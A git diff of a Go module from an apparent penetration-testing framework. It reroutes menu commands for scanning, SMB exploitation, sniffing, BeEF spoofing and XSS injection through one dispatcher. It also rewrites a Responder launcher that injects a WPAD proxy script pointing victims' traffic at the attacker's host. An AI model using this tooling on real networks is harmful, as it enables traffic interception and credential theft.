@@ -1,4 +1,5 @@
 //John 3:16
+
 package networks
 
 import(
@@ -121,31 +122,31 @@ func executeCommand(cmd string) bool {
 
         {[]string{"func", "funcs", "functions", "show func", "list funcs", "show funcs", "show function", "list function", "list functions", "show functions", "module", "modules", "list module", "show module", "list modules", "show modules", "show all", "list all"}, menus.ListInternalFunctions},
 
-        {[]string{"1", "run 1", "use 1", "exec 1", "start 1", "launch 1", "exploit 1", "execute 1", "run discover", "use discover", "exec discover", "start discover", "launch discover", "exploit discover", "execute discover"}, func() { DiscoverIps() }},
+        {[]string{"1", "run 1", "use 1", "exec 1", "start 1", "launch 1", "exploit 1", "execute 1", "run discover", "use discover", "exec discover", "start discover", "launch discover", "exploit discover", "execute discover"}, func() { NetworkPenFunctions("discover") }},
         {[]string{"? 1", "info 1", "help 1", "discover", "info discover", "help discover"}, menus.HelpInfoDiscover},
 
-        {[]string{"2", "run 2", "use 2", "exec 2", "start 2", "launch 2", "exploit 2", "execute 2", "run portscan", "use portscan", "exec portscan", "start portscan", "launch portscan", "exploit portscan", "execute portscan"}, func() { NmapPortScan(RHost) }},
+        {[]string{"2", "run 2", "use 2", "exec 2", "start 2", "launch 2", "exploit 2", "execute 2", "run portscan", "use portscan", "exec portscan", "start portscan", "launch portscan", "exploit portscan", "execute portscan"}, func() { NetworkPenFunctions("portscan") }},
         {[]string{"? 2", "info 2", "help 2", "portscan", "info portscan", "help portscan"}, menus.HelpInfoInPortScan},
 
-        {[]string{"3", "run 3", "use 3", "exec 3", "start 3", "launch 3", "exploit 3", "execute 3", "run vulnscan", "use vulnscan", "exec vulnscan", "start vulnscan", "launch vulnscan", "exploit vulnscan", "execute vulnscan"}, func() { NmapVulnScan(RHost) }},
+        {[]string{"3", "run 3", "use 3", "exec 3", "start 3", "launch 3", "exploit 3", "execute 3", "run vulnscan", "use vulnscan", "exec vulnscan", "start vulnscan", "launch vulnscan", "exploit vulnscan", "execute vulnscan"}, func() { NetworkPenFunctions("vulnscan") }},
         {[]string{"? 3", "info 3", "help 3", "vulnscan", "info vulnscan", "help vulnscan"}, menus.HelpInfoInVulnScan},
 
-        {[]string{"4", "run 4", "use 4", "exec 4", "start 4", "launch 4", "exploit 4", "execute 4", "run enumscan", "use enumscan", "exec enumscan", "start enumscan", "launch enumscan", "exploit enumscan", "execute enumscan"}, func() { SmbVulnScan(RHost); EnumNxc(RHost); Enum4linux(RHost); SmbMapScan(RHost) }},
+        {[]string{"4", "run 4", "use 4", "exec 4", "start 4", "launch 4", "exploit 4", "execute 4", "run enumscan", "use enumscan", "exec enumscan", "start enumscan", "launch enumscan", "exploit enumscan", "execute enumscan"}, func() { NetworkPenFunctions("enumscan") }},
         {[]string{"? 4", "info 4", "help 4", "enumscan", "info enumscan", "help enumscan"}, menus.HelpInfoInEnumScan},
 
-        {[]string{"5", "run 5", "use 5", "exec 5", "start 5", "launch 5", "exploit 5", "execute 5", "run smbexplo", "use smbexplo", "exec smbexplo", "start smbexplo", "launch smbexplo", "exploit smbexplo", "execute smbexplo"}, func() { SmbVulnScan(RHost); SmbExploit(RHost, LHost, LPort) }},
+        {[]string{"5", "run 5", "use 5", "exec 5", "start 5", "launch 5", "exploit 5", "execute 5", "run smbexplo", "use smbexplo", "exec smbexplo", "start smbexplo", "launch smbexplo", "exploit smbexplo", "execute smbexplo"}, func() { NetworkPenFunctions("smbexplo") }},
         {[]string{"? 5", "info 5", "help 5", "smbexplo", "info smbexplo", "help smbexplo"}, menus.HelpInfoSmbExplo},
 
-        {[]string{"6", "run 6", "use 6", "exec 6", "start 6", "launch 6", "exploit 6", "execute 6", "run psniffer", "use psniffer", "exec psniffer", "start psniffer", "launch psniffer", "exploit psniffer", "execute psniffer"}, func() { PacketSniffer(Mode, RHost) }},
+        {[]string{"6", "run 6", "use 6", "exec 6", "start 6", "launch 6", "exploit 6", "execute 6", "run psniffer", "use psniffer", "exec psniffer", "start psniffer", "launch psniffer", "exploit psniffer", "execute psniffer"}, func() { NetworkPenFunctions("psniffer") }},
         {[]string{"? 6", "info 6", "help 6", "psniffer", "info psniffer", "help psniffer"}, menus.HelpInfoPSniffer},
 
-        {[]string{"7", "run 7", "use 7", "exec 7", "start 7", "launch 7", "exploit 7", "execute 7", "run responda", "use responda", "exec responda", "start responda", "launch responda", "exploit responda", "execute responda"}, func() { KillerResponder(IFace, LHost) }},
+        {[]string{"7", "run 7", "use 7", "exec 7", "start 7", "launch 7", "exploit 7", "execute 7", "run responda", "use responda", "exec responda", "start responda", "launch responda", "exploit responda", "execute responda"}, func() { NetworkPenFunctions("responda") }},
         {[]string{"? 7", "info 7", "help 7", "responda", "info responda", "help responda"}, func() { menus.HelpInfoResponder(Mode, LPort, RHost, LHost)}},
 
-        {[]string{"8", "run 8", "use 8", "exec 8", "start 8", "launch 8", "exploit 8", "execute 8", "run beefkill", "use beefkill", "exec beefkill", "start beefkill", "launch beefkill", "exploit beefkill", "execute beefkill"}, func() { BeefKill(Spoofer, Mode, LHost, RHost, IFace, Passwd, FakeDns, Gateway) }},
+        {[]string{"8", "run 8", "use 8", "exec 8", "start 8", "launch 8", "exploit 8", "execute 8", "run beefkill", "use beefkill", "exec beefkill", "start beefkill", "launch beefkill", "exploit beefkill", "execute beefkill"}, func() { NetworkPenFunctions("beefkill") }},
         {[]string{"? 8", "info 8", "help 8", "beefkill", "info beefkill", "help beefkill"}, func() { menus.HelpInfoBeefKill(Mode, LPort, Spoofer, RHost, LHost)}},
 
-        {[]string{"9", "run 9", "use 9", "exec 9", "start 9", "launch 9", "exploit 9", "execute 9", "run toxssinx", "use toxssinx", "exec toxssinx", "start toxssinx", "launch toxssinx", "exploit toxssinx", "execute toxssinx"}, func() { ToxssInx(RHost) }},
+        {[]string{"9", "run 9", "use 9", "exec 9", "start 9", "launch 9", "exploit 9", "execute 9", "run toxssinx", "use toxssinx", "exec toxssinx", "start toxssinx", "launch toxssinx", "exploit toxssinx", "execute toxssinx"}, func() { NetworkPenFunctions("toxssinx") }},
         {[]string{"? 9", "info 9", "help 9", "toxssinx", "info toxssinx", "help toxssinx"}, func() { menus.HelpInfoToxssInx(Mode, LPort, Spoofer, RHost, LHost)}},
 
         {[]string{"10", "run 10", "use 10", "exec 10", "start 10", "launch 10", "exploit 10", "execute 10", "run verses", "use verses", "exec verses", "start verses", "launch verses", "exploit verses", "execute verses"}, scriptures.ScriptureNarators},
@@ -284,6 +285,27 @@ func handleUnsetCommand(parts []string) {
         "functions": &Function,
     }
 
+    defaultValues := map[string]string{
+        "mode":     "",
+        "lhost":    "",
+        "lport":    "",
+        "iface":    "",
+        "rhost":    "",
+        "rhosts":   "",
+        "target":   "",
+        "targets":  "",
+        "proxies":  "",
+        "passwd":   "",
+        "func":     "",
+        "funcs":    "",
+        "gateway":  "",
+        "fakedns":  "",
+        "spoofer":  "",
+        "module":   "",
+        "function": "",
+        "functions": "",
+    }
+
     validKeys := make([]string, 0, len(unsetValues))
     for k := range unsetValues {
         validKeys = append(validKeys, k)
@@ -355,12 +377,6 @@ func executeFunction() {
         return
     }
     NetworkPenFunctions(Function, IFace, Gateway, LHost, RHost, Mode, FakeDns, Spoofer)
-}
-
-func autoExecuteFunc(distro string, function string) {
-    //Distro = distro
-    //Function = function
-    executeFunction()
 }
 
 func NetworkPenFunctions(Function string, args ...interface{}) {
@@ -556,29 +572,26 @@ func PacketSniffer(Mode string, RHost string) {
 }
 
 func KillerResponder(IFace string, LHost string) {
-    filePath := "/etc/responder/Responder.conf.bak_africana"
-    if _, err := exec.LookPath("responder"); err != nil {
-        fmt.Printf("\n%s[!] %sResponder isn't installed, install it with %s'sudo apt install responder.'%s\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
-        return
-    }
+    filePath := "/root/.afr3/africana-base/networks/responder/Responder.conf.bak_africana"
+
     if _, err := os.Stat(filePath); os.IsNotExist(err) {
-        subprocess.Popen(`cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak_africana`)
+        subprocess.Popen(`cp /root/.afr3/africana-base/networks/responder/Responder.conf /root/.afr3/africana-base/networks/responder/Responder.conf.bak_africana`)
 
         newString  := fmt.Sprintf(`WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'`, LHost, LHost)
         filesToReplacements := map[string]map[string]string{
-            "/etc/responder/Responder.conf": {
+            "/root/.afr3/africana-base/networks/responder/Responder.conf": {
             `WPADScript =`: newString,
             },
         }
 
         utils.Editors(filesToReplacements)
 
-        subprocess.Popen(`responder -I %s -Pdv`, IFace)
-        subprocess.Popen(`rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`)
+        subprocess.Popen(`cd /root/.afr3/africana-base/networks/responder/; python3 Responder.py -I %s -Pdv`, IFace)
+        subprocess.Popen(`rm -rf /root/.afr3/africana-base/networks/responder/Responder.conf; mv /root/.afr3/africana-base/networks/responder/Responder.conf.bak_africana /root/.afr3/africana-base/networks/responder/Responder.conf`)
 
     } else {
-        subprocess.Popen(`responder -I %s -Pdv`, IFace)
-        subprocess.Popen(`rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`)
+        subprocess.Popen(`cd /root/.afr3/africana-base/networks/responder/; python3 Responder.py -I %s -Pdv`, IFace)
+        subprocess.Popen(`rm -rf /root/.afr3/africana-base/networks/responder/Responder.conf; mv /root/.afr3/africana-base/networks/responder/Responder.conf.bak_africana /root/.afr3/africana-base/networks/responder/Responder.conf`)
     }
 }
 
